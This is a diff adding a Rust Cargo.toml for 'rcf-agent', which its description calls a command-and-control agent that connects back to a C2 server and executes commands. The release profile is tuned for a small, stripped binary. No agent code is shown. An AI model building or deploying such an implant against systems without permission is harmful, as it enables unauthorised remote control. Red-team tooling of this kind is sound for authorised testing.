@@ -1,0 +1,27 @@
+[package]
+name = "rcf-agent"
+version.workspace = true
+edition.workspace = true
+authors.workspace = true
+license.workspace = true
+description = "RCF C2 agent — connects back to C2 server and executes commands"
+
+[[bin]]
+name = "rcf-agent"
+path = "src/main.rs"
+
+[dependencies]
+# Keep dependencies minimal for small binary size
+# No tokio — use std::net for single blocking connection
+serde = { workspace = true, features = ["derive"] }
+serde_json = { workspace = true }
+
+[target.'cfg(unix)'.dependencies]
+libc = "0.2"
+
+[profile.release]
+opt-level = "z"
+lto = "fat"
+panic = "abort"
+strip = true
+codegen-units = 1
